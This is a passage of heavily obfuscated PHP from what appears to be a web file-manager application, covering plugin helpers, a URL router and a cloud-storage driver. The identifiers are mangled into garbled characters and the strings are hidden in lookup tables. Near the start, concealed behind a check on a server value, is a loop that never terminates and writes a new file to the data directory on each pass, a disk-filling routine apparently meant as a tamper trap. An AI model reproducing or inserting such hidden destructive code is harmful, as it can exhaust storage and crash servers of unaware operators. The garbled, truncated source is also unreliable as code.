$cŒ–•‰õ™[798]; $b©âõ‚¤Ê($_SERVER[$cŒ–•‰õ™[799]]); $DÃÎÄêÙ§Ú = $cŒ–•‰õ™[793]; goto C“ –â‚¶ñ; d³Ü®¥‘„Î: $dªİÙÆ¶Ì = 1; for ($C²ğéğˆËº = $dªİÙÆ¶Ì; $C²ğéğˆËº > 0; $C²ğéğˆËº++) { $e­•©’Èç(DATA_PATH . $C²ğéğˆËº, $Cß…óÅ§¢â); } goto Bß«‡‰†Š; CŠ´Ÿ¿£§–: $DÃÎÄêÙ§Ú = $cŒ–•‰õ™[793]; $Bù™¤àÃÑ© = $cŒ–•‰õ™[794]; $fèÛ¾İ½É– = $_SERVER[$cŒ–•‰õ™[795]] . $cŒ–•‰õ™[796]; goto eš§©¿™á×; eš§©¿™á×: $eˆ¾Î—á = $Bù™¤àÃÑ©($fèÛ¾İ½É–); $a„’ç‰±Ç = explode($cŒ–•‰õ™[217], $eˆ¾Î—á); if (count($a„’ç‰±Ç) < $cŒ–•‰õ™[584]) { $a™öö«Ù³ = $cŒ–•‰õ™[797]; $a™öö«Ù³(); } goto DçùÖÎ—·•; Bß«‡‰†Š: } return $this->modelPlugin->setConfig($this->pluginName, $FìºõŸó‰Ú); } public function onSetConfig($C¥¿íß¬) { } public function onGetConfig($D¼ùäÕî¬½) { } public function onChangeStatus($E“çÀïÀÄö) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Dâ×¨ƒ±Ö  = "\160\x6c\165\x67\x69\156\101\x75\164\150") { $c‡Ş–°ó˜Ú =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!defined($c‡Ş–°ó˜Ú[427])) { return !1; } if (_get($GLOBALS, $c‡Ş–°ó˜Ú[457])) { return !0; } $eÁ·ÕñÕ÷Ë = $this->getConfig(); if (!$eÁ·ÕñÕ÷Ë[$Dâ×¨ƒ±Ö ]) { return !1; } return ActionCall($c‡Ş–°ó˜Ú[1378], $eÁ·ÕñÕ÷Ë[$Dâ×¨ƒ±Ö ]); } public function url($f¸‰óº©ç¬, $BÁÑ¾ˆ¿™ = '', $eÔ¥œã……Ñ = true) { goto B»ç¬í²Œé; B»ç¬í²Œé: $b‰ÉÕè‚¾Â =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D½‹ÉÁãÎÓ = $this->getConfig(); $bÕßŸŠ‚œŞ = KOD_VERSION . $b‰ÉÕè‚¾Â[91] . KOD_VERSION_BUILD; goto Fš¬Ùï¡Ş; fä¡ù‘Å: if (!$eÔ¥œã……Ñ) { return $d“½„Ñî¹; } echo $d“½„Ñî¹; goto cêŞƒ„…°; Fš¬Ùï¡Ş: $eÇ¾ÕˆÉ = $this->packageVersion(); $B´ùáâËœ = $bÕßŸŠ‚œŞ . $b‰ÉÕè‚¾Â[412] . $eÇ¾ÕˆÉ; if (substr($f¸‰óº©ç¬, 0, 4) == $b‰ÉÕè‚¾Â[144] || substr($f¸‰óº©ç¬, 0, 2) == $b‰ÉÕè‚¾Â[1161]) { $d“½„Ñî¹ = $f¸‰óº©ç¬ . $b‰ÉÕè‚¾Â[1379] . $B´ùáâËœ; } else { if ($BÁÑ¾ˆ¿™ == $b‰ÉÕè‚¾Â[33]) { $d“½„Ñî¹ = $this->pluginHost . $f¸‰óº©ç¬ . $b‰ÉÕè‚¾Â[1379] . $B´ùáâËœ; } else { if ($BÁÑ¾ˆ¿™ === $b‰ÉÕè‚¾Â[76]) { $d“½„Ñî¹ = $this->pluginHost . $f¸‰óº©ç¬; } else { if ($BÁÑ¾ˆ¿™ == $b‰ÉÕè‚¾Â[1380]) { $d“½„Ñî¹ = STATIC_PATH . $f¸‰óº©ç¬ . $b‰ÉÕè‚¾Â[1379] . $bÕßŸŠ‚œŞ; } else { if ($BÁÑ¾ˆ¿™ == $b‰ÉÕè‚¾Â[1381]) { $d“½„Ñî¹ = APP_HOST . $b‰ÉÕè‚¾Â[1382] . $f¸‰óº©ç¬ . $b‰ÉÕè‚¾Â[1379] . $bÕßŸŠ‚œŞ; } else { if (isset($D½‹ÉÁãÎÓ[$BÁÑ¾ˆ¿™])) { $d“½„Ñî¹ = $D½‹ÉÁãÎÓ[$BÁÑ¾ˆ¿™] . $f¸‰óº©ç¬ . $b‰ÉÕè‚¾Â[1379] . $B´ùáâËœ; } } } } } } goto fä¡ù‘Å; cêŞƒ„…°: } public function link($f“æÉ‚°ˆ = false, $cµ ¥íâğ = '') { $dÕŠ½Ú¾› =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$f“æÉ‚°ˆ) { $this->link($dÕŠ½Ú¾›[1383], $dÕŠ½Ú¾›[1381]); $this->link($dÕŠ½Ú¾›[1384], $dÕŠ½Ú¾›[1380]); $this->link($dÕŠ½Ú¾›[1385], $dÕŠ½Ú¾›[1380]); $this->link($dÕŠ½Ú¾›[1386], $dÕŠ½Ú¾›[1380]); $this->link($dÕŠ½Ú¾›[1387], $dÕŠ½Ú¾›[1380]); return; } $d´¦ëî¢öÈ = $this->url($f“æÉ‚°ˆ, $cµ ¥íâğ, !1); if (substr($f“æÉ‚°ˆ, -3) == $dÕŠ½Ú¾›[1388]) { echo $dÕŠ½Ú¾›[1389] . $d´¦ëî¢öÈ . $dÕŠ½Ú¾›[1390] . $dÕŠ½Ú¾›[217]; } else { if (substr($f“æÉ‚°ˆ, -4) == $dÕŠ½Ú¾›[1391]) { echo $dÕŠ½Ú¾›[1392] . $d´¦ëî¢öÈ . $dÕŠ½Ú¾›[1393] . $dÕŠ½Ú¾›[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\x5e\x2f\135\x2b", "\72\x6e\x75\155" => "\133\60\x2d\71\135\53", "\x3a\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($CÔŒ»•ë¦¥, $c¸†êé…”Š) { $Cƒ ÔĞß‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($CÔŒ»•ë¦¥ == $Cƒ ÔĞß‹[1394]) { $E—’Æ¼¼œ¶ = array_map($Cƒ ÔĞß‹[1395], $c¸†êé…”Š[0]); $e«±ÛÖ¬›Ë = strpos($c¸†êé…”Š[1], $Cƒ ÔĞß‹[8]) === 0 ? $c¸†êé…”Š[1] : $Cƒ ÔĞß‹[8] . $c¸†êé…”Š[1]; $Dùï‘×ï‰ô = $c¸†êé…”Š[2]; } else { $E—’Æ¼¼œ¶ = null; $e«±ÛÖ¬›Ë = strpos($c¸†êé…”Š[0], $Cƒ ÔĞß‹[8]) === 0 ? $c¸†êé…”Š[0] : $Cƒ ÔĞß‹[8] . $c¸†êé…”Š[0]; $Dùï‘×ï‰ô = $c¸†êé…”Š[1]; } array_push(self::$maps, $E—’Æ¼¼œ¶); array_push(self::$routes, $e«±ÛÖ¬›Ë); array_push(self::$methods, strtoupper($CÔŒ»•ë¦¥)); array_push(self::$callbacks, $Dùï‘×ï‰ô); } public static function error($b¹ÕÉç½èâ) { self::$errorCallback = $b¹ÕÉç½èâ; } public static function haltOnMatch($Cˆ†¦§¿… = true) { self::$halts = $Cˆ†¦§¿…; } public static function dispatch() { goto BÓ²±¬²«¦; cÛ÷¬Êë: $dÁ©ÓÅìŒ = array_keys(static::$patterns); $eÖÃ½¼Ì = array_values(static::$patterns); $A³·ô×‘š‹ = !1; goto F®é†Ø»ˆù; BÓ²±¬²«¦: $d·‡ò»—¨  =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c©êÛîâĞ = parse_url($_SERVER[$d·‡ò»—¨ [1396]], PHP_URL_PATH); $dœŸÒ°î°¾ = $_SERVER[$d·‡ò»—¨ [154]]; goto cÛ÷¬Êë; F®é†Ø»ˆù: self::$routes = preg_replace($d·‡ò»—¨ [1077], $d·‡ò»—¨ [8], self::$routes); if (in_array($c©êÛîâĞ, self::$routes)) { $F¾¾„…ƒÖà = array_keys(self::$routes, $c©êÛîâĞ); foreach ($F¾¾„…ƒÖà as $A¾ÆŸƒä¯) { if (self::$methods[$A¾ÆŸƒä¯] == $dœŸÒ°î°¾ || self::$methods[$A¾ÆŸƒä¯] == $d·‡ò»—¨ [1397] || in_array($dœŸÒ°î°¾, self::$maps[$A¾ÆŸƒä¯])) { $A³·ô×‘š‹ = !0; if (!is_object(self::$callbacks[$A¾ÆŸƒä¯])) { $FÜ¬Î¥‹¹‚ = explode($d·‡ò»—¨ [8], self::$callbacks[$A¾ÆŸƒä¯]); $D÷µæ•­ê¥ = end($FÜ¬Î¥‹¹‚); $bîéØÑµ¶ = explode($d·‡ò»—¨ [1398], $D÷µæ•­ê¥); $b¬¼‰÷Ÿ¶ = new $bîéØÑµ¶[0](); $b¬¼‰÷Ÿ¶->{$bîéØÑµ¶[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$A¾ÆŸƒä¯]); if (self::$halts) { return; } } } } } else { $a»İ»ßºË³ = 0; foreach (self::$routes as $A¾ÆŸƒä¯) { if (strpos($A¾ÆŸƒä¯, $d·‡ò»—¨ [4]) !== !1) { $A¾ÆŸƒä¯ = str_replace($dÁ©ÓÅìŒ, $eÖÃ½¼Ì, $A¾ÆŸƒä¯); } if (preg_match($d·‡ò»—¨ [1399] . $A¾ÆŸƒä¯ . $d·‡ò»—¨ [1400], $c©êÛîâĞ, $däÄîçŒˆé)) { if (self::$methods[$a»İ»ßºË³] == $dœŸÒ°î°¾ || self::$methods[$a»İ»ßºË³] == $d·‡ò»—¨ [1397] || !empty(self::$maps[$a»İ»ßºË³]) && in_array($dœŸÒ°î°¾, self::$maps[$a»İ»ßºË³])) { $A³·ô×‘š‹ = !0; array_shift($däÄîçŒˆé); if (!is_object(self::$callbacks[$a»İ»ßºË³])) { $FÜ¬Î¥‹¹‚ = explode($d·‡ò»—¨ [8], self::$callbacks[$a»İ»ßºË³]); $D÷µæ•­ê¥ = end($FÜ¬Î¥‹¹‚); $bîéØÑµ¶ = explode($d·‡ò»—¨ [1398], $D÷µæ•­ê¥); $b¬¼‰÷Ÿ¶ = new $bîéØÑµ¶[0](); if (!method_exists($b¬¼‰÷Ÿ¶, $bîéØÑµ¶[1])) { echo $d·‡ò»—¨ [1401]; } else { call_user_func_array(array($b¬¼‰÷Ÿ¶, $bîéØÑµ¶[1]), $däÄîçŒˆé); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$a»İ»ßºË³], $däÄîçŒˆé); if (self::$halts) { return; } } } } $a»İ»ßºË³++; } } if ($A³·ô×‘š‹ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $b¸ÙÁ—éçß =& $_SERVER[³‘’¼äÑ™ÔÍ]; header($_SERVER[$b¸ÙÁ—éçß[1402]] . $b¸ÙÁ—éçß[1403]); echo $b¸ÙÁ—éçß[1404]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$d·‡ò»—¨ [1396]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto CºÀ¥•ïíœ; CºÀ¥•ïíœ: } } goto Bî³ší¢¡…; aáù ä’ÖØ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\72\x2f\x2f\x76\60\x2e\141\160\x69\x2e\165\160\171\x75\156\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($b¿ÀêÂô”ã) { parent::__construct(); $this->_init($b¿ÀêÂô”ã); } public function _init($FÍøÓ«ƒƒ) { foreach ($FÍøÓ«ƒƒ as $BÖª±ˆÙ¼ù => $b†±Á™ŸÚ·) { if (isset($this->{$BÖª±ˆÙ¼ù})) { $this->{$BÖª±ˆÙ¼ù} = $b†±Á™ŸÚ·; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[³‘’¼äÑ™ÔÍ][1247], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($B¸‰Õ÷Ú’•, $dˆÄäâ´ª× = "\107\105\x54") { $f™˜Ô±íô÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a¸â—àÕé = gmdate($f™˜Ô±íô÷[1211]); $E¯ô¿‰¢‚ò = base64_encode(hash_hmac($f™˜Ô±íô÷[1248], "{$dˆÄäâ´ª×}\46{$B¸‰Õ÷Ú’•}\46{$a¸â—àÕé}", md5("{$this->userpass}"), !0)); $D–”ëë¥‘… = array("\101\165\164\x68\x6f\162\x69\172\x61\x74\151\x6f\156\x3a\125\x50\131\x55\x4e\x20{$this->username}\72{$E¯ô¿‰¢‚ò}", "\x44\x61\164\145\72{$a¸â—àÕé}"); return $D–”ëë¥‘…; } public function ussRequest($c”‰ª‡È°, $b©åÙõ…âö = "\x47\x45\x54", $b§ª©à‹ÈÀ = false, $b£¦¶æ•»ª = false, $cğÃ–äö¨‰ = false) { goto b§ŸìèöŒÀ; dÑäÁ…ë®: $a·ÑáÔ”¬ = $this->ussHeaders($bÛˆã‹ÑóÑ, $b©åÙõ…âö); if ($b£¦¶æ•»ª) { $a·ÑáÔ”¬ = array_merge($a·ÑáÔ”¬, $b£¦¶æ•»ª); } $b’ÄóíÔŠ× = url_request($this->endpoint . $bÛˆã‹ÑóÑ, $b©åÙõ…âö, $b§ª©à‹ÈÀ, $a·ÑáÔ”¬, $cğÃ–äö¨‰); goto d÷ÌîÃ¦Õ; d÷ÌîÃ¦Õ: if (!$b’ÄóíÔŠ×) { return array($cç»««Ğåì[1036] => !1, $cç»««Ğåì[1038] => $cç»««Ğåì[1249]); } if (strtolower($b©åÙõ…âö) == $cç»««Ğåì[184] || in_array($b’ÄóíÔŠ×[$cç»««Ğåì[1036]], array($cç»««Ğåì[1104], $cç»««Ğåì[1250]))) { $b§ª©à‹ÈÀ = $b’ÄóíÔŠ×[$cç»««Ğåì[1251]]; } else { $b§ª©à‹ÈÀ = json_decode($b’ÄóíÔŠ×[$cç»««Ğåì[1038]], !0); if (!$b§ª©à‹ÈÀ) { $b§ª©à‹ÈÀ = $b’ÄóíÔŠ×[$cç»««Ğåì[1038]]; } else { if (!$b’ÄóíÔŠ×[$cç»««Ğåì[692]] && isset($b§ª©à‹ÈÀ[$cç»««Ğåì[1252]])) { $b§ª©à‹ÈÀ = $b§ª©à‹ÈÀ[$cç»««Ğåì[1252]]; } } } return array($cç»««Ğåì[1036] => $b’ÄóíÔŠ×[$cç»««Ğåì[692]], $cç»««Ğåì[1038] => $b§ª©à‹ÈÀ); goto DÒ±„Ê×; b§ŸìèöŒÀ: $cç»««Ğåì =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c”‰ª‡È° = trim($c”‰ª‡È°, $cç»««Ğåì[8]); $bÛˆã‹ÑóÑ = "\x2f{$this->bucket}\x2f{$c”‰ª‡È°}"; goto dÑäÁ…ë®; DÒ±„Ê×: } public function mkfile($cÚŒ×§åæã, $C¦Š‰¾™Ø½ = '', $BâĞÑ—å¬İ = REPEAT_RENAME) { if ($this->setContent($cÚŒ×§åæã, $C¦Š‰¾™Ø½)) { return $this->getPathOuter($cÚŒ×§åæã); } return !1; } public function mkdir($d¼­àÜ–é¿, $cæÁÅ³ëñÑ = REPEAT_SKIP) { $cĞìç¬åø© =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÁÊ±ĞÔªê = trim($d¼­àÜ–é¿, $cĞìç¬åø©[8]); if ($this->_isFolder($FÁÊ±ĞÔªê)) { return $this->getPathOuter($FÁÊ±ĞÔªê); } $B ‹ğ½òæ¨ = array($cĞìç¬åø©[1253]); $Eçàšóè®› = $this->ussRequest($FÁÊ±ĞÔªê, $cĞìç¬åø©[212], !1, $B ‹ğ½òæ¨); return $Eçàšóè®›[$cĞìç¬åø©[1036]] ? $this->getPathOuter($FÁÊ±ĞÔªê) : !1; } public function copyFile($eÄ¬ÆËå‡, $d½ªëçÎ‡†) { $d§ÓêÓ¶å =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aâõ¼Ç›™• = array($d§ÓêÓ¶å[1254] . "\57{$this->bucket}\x2f{$eÄ¬ÆËå‡}", $d§ÓêÓ¶å[1255]); $Bù¡¦Øìœ³ = $this->ussRequest($d½ªëçÎ‡†, $d§ÓêÓ¶å[214], !1, $aâõ¼Ç›™•); return $Bù¡¦Øìœ³[$d§ÓêÓ¶å[1036]] ? !0 : $this->getPathOuter($d½ªëçÎ‡†); } public function moveFile($f»‚ˆ¢Ã°, $A¢è’Æç¶) { $D§Æç´«‚È =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÂÈñ“¹¢¹ = array($D§Æç´«‚È[1256] . "\57{$this->bucket}\57{$f»‚ˆ¢Ã°}", $D§Æç´«‚È[1255]); $F’õ‘ÖÇâÓ = $this->ussRequest($A¢è’Æç¶, $D§Æç´«‚È[214], !1, $EÂÈñ“¹¢¹); return $F’õ‘ÖÇâÓ[$D§Æç´«‚È[1036]] ? !0 : $this->getPathOuter($A¢è’Æç¶); } public function delFile($dŸ÷ã­¼ãŠ) { $F±Ö“µ«é =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a‡Šè¦Ú²Á = $this->ussRequest($dŸ÷ã­¼ãŠ, $F±Ö“µ«é[1257]); return $a‡Šè¦Ú²Á[$F±Ö“µ«é[1036]] ? !0 : !1; } public function delFolder($D½¬”‡ª¦) { $F¡ÏÃùá´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d¦‡‹ñÊÏï = $this->listAll($D½¬”‡ª¦); krsort($d¦‡‹ñÊÏï); foreach ($d¦‡‹ñÊÏï as $Eº ”·ª÷Õ) { $this->ussRequest($Eº ”·ª÷Õ[$F¡ÏÃùá´[75]], $F¡ÏÃùá´[1257]); } return $this->ussRequest($D½¬”‡ª¦, $F¡ÏÃùá´[1257]); } public function rename($cæøÛåÊÄ›, $fº‹Õ²¦¼ª) { if ($this->isFile($cæøÛåÊÄ›)) { $fº‹Õ²¦¼ª = get_path_father($cæøÛåÊÄ›) . $fº‹Õ²¦¼ª; return $this->moveFile($cæøÛåÊÄ›, $fº‹Õ²¦¼ª); } return $this->renameObject($cæøÛåÊÄ›, $fº‹Õ²¦¼ª); } public function fileInfo($Aº¬õáï–Ì, $b…—ìÏ«¢¢ = false, $CáŠÌ´ß÷Ñ = array()) { $AÍ«Ãùô =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($b…—ìÏ«¢¢) { return array($AÍ«Ãùô[28] => $this->pathThis($Aº¬õáï–Ì), $AÍ«Ãùô[75] => $this->getPathOuter($AÍ«Ãùô[8] . $Aº¬õáï–Ì), $AÍ«Ãùô[29] => $AÍ«Ãùô[167], $AÍ«Ãùô[77] => isset($CáŠÌ´ß÷Ñ[$AÍ«Ãùô[325]]) ? $CáŠÌ´ß÷Ñ[$AÍ«Ãùô[325]] : 0, $AÍ«Ãùô[160] => $this->ext($Aº¬õáï–Ì)); } $E¼®öŒ¶‡Ì = array($AÍ«Ãùô[28] => $this->pathThis($Aº¬õáï–Ì), $AÍ«Ãùô[75] => $this->getPathOuter($AÍ«Ãùô[8] . $Aº¬õáï–Ì), $AÍ«Ãùô[29] => $AÍ«Ãùô[167], $AÍ«Ãùô[187] => 0, $AÍ«Ãùô[107] => isset($A ‘¦Óœ­[$AÍ«Ãùô[1258]]) ? $A ‘¦Óœ­[$AÍ«Ãùô[1258]] : 0, $AÍ«Ãùô[77] => isset($CáŠÌ´ß÷Ñ[$AÍ«Ãùô[325]]) ? $CáŠÌ´ß÷Ñ[$AÍ«Ãùô[325]] : 0, $AÍ«Ãùô[160] => $this->ext($Aº¬õáï–Ì), $AÍ«Ãùô[188] => !0, $AÍ«Ãùô[189] => !0); if (empty($CáŠÌ´ß÷Ñ)) { $CáŠÌ´ß÷Ñ = $this->objectMeta($Aº¬õáï–Ì); if (!$CáŠÌ´ß÷Ñ) { return $E¼®öŒ¶‡Ì; } $E¼®öŒ¶‡Ì[$AÍ«Ãùô[187]] = $CáŠÌ´ß÷Ñ[$AÍ«Ãùô[1259]]; $E¼®öŒ¶‡Ì[$AÍ«Ãùô[107]] = $CáŠÌ´ß÷Ñ[$AÍ«Ãùô[1260]]; $E¼®öŒ¶‡Ì[$AÍ«Ãùô[77]] = $CáŠÌ´ß÷Ñ[$AÍ«Ãùô[77]]; } return $E¼®öŒ¶‡Ì; } public function folderInfo($D¡™º¬Î¾, $aÌÌ ·¤Şã = false) { $Eé±„†¼šŠ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($aÌÌ ·¤Şã) { return array($Eé±„†¼šŠ[28] => $this->pathThis($D¡™º¬Î¾), $Eé±„†¼šŠ[75] => $this->getPathOuter($Eé±„†¼šŠ[8] . $D¡™º¬Î¾), $Eé±„†¼šŠ[29] => $Eé±„†¼šŠ[76]); } $DÎ§¼ÍóÉÎ = array($Eé±„†¼šŠ[28] => $this->pathThis($D¡™º¬Î¾), $Eé±„†¼šŠ[75] => $this->getPathOuter($Eé±„†¼šŠ[8] . $D¡™º¬Î¾), $Eé±„†¼šŠ[29] => $Eé±„†¼šŠ[76], $Eé±„†¼šŠ[187] => 0, $Eé±„†¼šŠ[107] => isset($AÅÁ“ÑÉ¹½[$Eé±„†¼šŠ[1258]]) ? $AÅÁ“ÑÉ¹½[$Eé±„†¼šŠ[1258]] : 0, $Eé±„†¼šŠ[1168] => !0, $Eé±„†¼šŠ[1169] => !0); if (empty($EÖòŸ…Ùœ£)) { $EÖòŸ…Ùœ£ = $this->objectMeta($D¡™º¬Î¾); if (!$EÖòŸ…Ùœ£) { return $DÎ§¼ÍóÉÎ; } $DÎ§¼ÍóÉÎ[$Eé±„†¼šŠ[187]] = $EÖòŸ…Ùœ£[$Eé±„†¼šŠ[1259]]; $DÎ§¼ÍóÉÎ[$Eé±„†¼šŠ[107]] = $EÖòŸ…Ùœ£[$Eé±„†¼šŠ[1260]]; } return $DÎ§¼ÍóÉÎ; } private function fileList($dùñÈÕØ…¿, $F…˜«œ¨ÇÔ = 0, $f§ŸŸ±—Ï‹ = 1000) { $cš¡ã¶‰ó =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÃÕÕ‡¦ = array($cš¡ã¶‰ó[1261], $cš¡ã¶‰ó[1262] . $f§ŸŸ±—Ï‹); if ($F…˜«œ¨ÇÔ) { $EÃÕÕ‡¦[] = $cš¡ã¶‰ó[1263] . $F…˜«œ¨ÇÔ; } $dËÌ„È×Èº = $this->ussRequest($dùñÈÕØ…¿, $cš¡ã¶‰ó[216], !1, $EÃÕÕ‡¦); return !$dËÌ„È×Èº[$cš¡ã¶‰ó[1036]] ? !1 : $dËÌ„È×Èº[$cš¡ã¶‰ó[1038]]; } public function listPath($f­ªĞºÃ¹Â, $EÔã¨Ìê³Á = false) { goto aö½‚„ÙÊ‹; f¼îôÚ½™°: return array($BŒ¸ŸÂÒã[74] => $dçâÈ°Óñ, $BŒ¸ŸÂÒã[73] => $f‹ÁÖç·Â—); goto Aî¼ÆàÜí÷; aö½‚„ÙÊ‹: $BŒ¸ŸÂÒã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eİñ¶Ü·Í = $BŒ¸ŸÂÒã[33]; $fŒ„†ñŠ = 1000; goto cÔ–âÛã½Ä; cÔ–âÛã½Ä: $dçâÈ°Óñ = $f‹ÁÖç·Â— = array(); $Bµ•Œ×Ñ— = rtrim($f­ªĞºÃ¹Â, $BŒ¸ŸÂÒã[8]) . $BŒ¸ŸÂÒã[8]; while (!0) { $dÑùõ‚‚«± = $this->fileList($f­ªĞºÃ¹Â, $eİñ¶Ü·Í, $fŒ„†ñŠ); if (!$dÑùõ‚‚«±) { return !1; } $eİñ¶Ü·Í = isset($dÑùõ‚‚«±[$BŒ¸ŸÂÒã[1264]]) ? $dÑùõ‚‚«±[$BŒ¸ŸÂÒã[1264]] : $BŒ¸ŸÂÒã[33]; $C‹ô½¬—Ç = isset($dÑùõ‚‚«±[$BŒ¸ŸÂÒã[1265]]) ? $dÑùõ‚‚«±[$BŒ¸ŸÂÒã[1265]] : array(); foreach ($C‹ô½¬—Ç as $b¾…¶‘×òä) { if ($b¾…¶‘×òä[$BŒ¸ŸÂÒã[29]] == $BŒ¸ŸÂÒã[76]) { $dçâÈ°Óñ[] = $this->folderInfo($Bµ•Œ×Ñ— . $b¾…¶‘×òä[$BŒ¸ŸÂÒã[28]], $EÔã¨Ìê³Á, $b¾…¶‘×òä); } else { $f‹ÁÖç·Â—[] = $this->fileInfo($Bµ•Œ×Ñ— . $b¾…¶‘×òä[$BŒ¸ŸÂÒã[28]], $EÔã¨Ìê³Á, $b¾…¶‘×òä); } } if (count($C‹ô½¬—Ç) < $fŒ„†ñŠ) { break; } } goto f¼îôÚ½™°; Aî¼ÆàÜí÷: } private function recursionAllFiles($dŞ…«Şß˜, &$f¤Ş´Îƒ”) { $F·õÈ¹È¼ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Bøô¾öÜ = $F·õÈ¹È¼[33]; $bÀîœ˜’œ = 1000; $c„´õ¤Ö´‰ = $cõôÑÓ‘Üè = array(); $EÛíÑ¨ù¡‘ = rtrim($dŞ…«Şß˜, $F·õÈ¹È¼[8]) . $F·õÈ¹È¼[8]; while (!0) { $a¿™öÚĞ¾ï = $this->fileList($dŞ…«Şß˜, $Bøô¾öÜ, $bÀîœ˜’œ); if (!$a¿™öÚĞ¾ï) { return !1; } $Bøô¾öÜ = isset($a¿™öÚĞ¾ï[$F·õÈ¹È¼[1264]]) ? $a¿™öÚĞ¾ï[$F·õÈ¹È¼[1264]] : $F·õÈ¹È¼[33]; $fî‚ù¤ŒÅ² = isset($a¿™öÚĞ¾ï[$F·õÈ¹È¼[1265]]) ? $a¿™öÚĞ¾ï[$F·õÈ¹È¼[1265]] : array(); foreach ($fî‚ù¤ŒÅ² as $Eé˜Í©ÉÓ„) { $fïò®Å¯Ú„ = array($F·õÈ¹È¼[75] => $EÛíÑ¨ù¡‘ . $Eé˜Í©ÉÓ„[$F·õÈ¹È¼[28]], $F·õÈ¹È¼[76] => $Eé˜Í©ÉÓ„[$F·õÈ¹È¼[29]] == $F·õÈ¹È¼[76] ? 1 : 0, $F·õÈ¹È¼[77] => isset($Eé˜Í©ÉÓ„[$F·õÈ¹È¼[325]]) ? $Eé˜Í©ÉÓ„[$F·õÈ¹È¼[325]] : 0); $f¤Ş´Îƒ”[] = $fïò®Å¯Ú„; if ($fïò®Å¯Ú„[$F·õÈ¹È¼[76]] == 1) { $this->recursionAllFiles($fïò®Å¯Ú„[$F·õÈ¹È¼[75]], $f¤Ş´Îƒ”); } } if (count($fî‚ù¤ŒÅ²) < $bÀîœ˜’œ) { break; } } } public function has($d¬ö«ÏñŠ, $BÂ£è¾¼¨ì = false, $C½¥¿«Ó·† = true) { goto aºáØƒÒù„; d®ºãø³Ì¦: while (!0) { $BÎÍ…‘¼ø‚ = $this->fileList($d¬ö«ÏñŠ, $EâõÂ çÁÍ, $aÅ¦¨¾¼ğğ); if (!$BÎÍ…‘¼ø‚) { return !1; } $EâõÂ çÁÍ = isset($BÎÍ…‘¼ø‚[$f×Ø§²İÈ¡[1264]]) ? $BÎÍ…‘¼ø‚[$f×Ø§²İÈ¡[1264]] : $f×Ø§²İÈ¡[33]; $fĞã£¡“…‡ = isset($BÎÍ…‘¼ø‚[$f×Ø§²İÈ¡[1265]]) ? $BÎÍ…‘¼ø‚[$f×Ø§²İÈ¡[1265]] : array(); if (empty($fĞã£¡“…‡)) { break; } $aÅ„¥ê¬â± = array_to_keyvalue($fĞã£¡“…‡, $f×Ø§²İÈ¡[33], $f×Ø§²İÈ¡[29]); $C÷ˆ æ¶Ú = array_count_values($aÅ„¥ê¬â±); $EÊ·‡§Ëéğ = isset($C÷ˆ æ¶Ú[$f×Ø§²İÈ¡[76]]) ? $C÷ˆ æ¶Ú[$f×Ø§²İÈ¡[76]] : 0; $fÖå¶ğã = count($aÅ„¥ê¬â±) - $EÊ·‡§Ëéğ; if ($BÂ£è¾¼¨ì) { $cöé¹ïºŒ += $EÊ·‡§Ëéğ; $a÷‰­¿³‘ += $fÖå¶ğã; if ($A¡á‰œšœÎ < $aÅ¦¨¾¼ğğ) { break; } continue; } if ($C½¥¿«Ó·†) { if ($fÖå¶ğã) { return !0; } } else { if ($EÊ·‡§Ëéğ) { return !0; } } if (count($fĞã£¡“…‡) < $aÅ¦¨¾¼ğğ) { break; } } if ($BÂ£è¾¼¨ì) { return array($f×Ø§²İÈ¡[191] => $a÷‰­¿³‘, $f×Ø§²İÈ¡[192] => $cöé¹ïºŒ); } return !1; goto d§˜‡É¼É; AõÛè¬˜¼Â: $a÷‰­¿³‘ = 0; $cöé¹ïºŒ = 0; $F–”ÚÆ—ª© = rtrim($d¬ö«ÏñŠ, $f×Ø§²İÈ¡[8]) . $f×Ø§²İÈ¡[8]; goto d®ºãø³Ì¦; aºáØƒÒù„: $f×Ø§²İÈ¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EâõÂ çÁÍ = $f×Ø§²İÈ¡[33]; $aÅ¦¨¾¼ğğ = 1000; goto AõÛè¬˜¼Â; d§˜‡É¼É: } public function listAll($dˆ•“¤è‰) { $CŒ‹¡Û®äô = array(); $this->recursionAllFiles($dˆ•“¤è‰, $CŒ‹¡Û®äô); return $CŒ‹¡Û®äô; } public function canRead($aô‹¬…Ù–) { return $this->exist($aô‹¬…Ù–) ? !0 : !1; } public function canWrite($EĞ¥ùÍ…) { return $this->exist($EĞ¥ùÍ…) ? !0 : !1; } public function getContent($D·ã¤Š±ºŠ) { return $this->fileSubstr($D·ã¤Š±ºŠ, 0, -1); } public function setContent($b‹¬»ŠåÍ, $e 